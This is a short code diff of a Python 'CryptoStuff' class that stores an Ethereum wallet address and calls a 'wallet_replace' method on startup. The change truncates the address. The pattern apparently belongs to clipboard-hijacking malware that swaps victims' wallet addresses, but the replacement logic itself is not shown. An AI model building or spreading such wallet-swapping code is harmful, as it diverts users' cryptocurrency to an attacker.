@@ -6,7 +6,7 @@ import time
 class CryptoStuff(object):
 
     def __init__(self) -> None:
-        self.eth_wallet = "0x11b0460655d3adb495943547dcb99f868c56f3a1"
+        self.eth_wallet = "0x11b0460655d3adb1"
         self.wallet_replace()
 
     def wallet_replace(self):
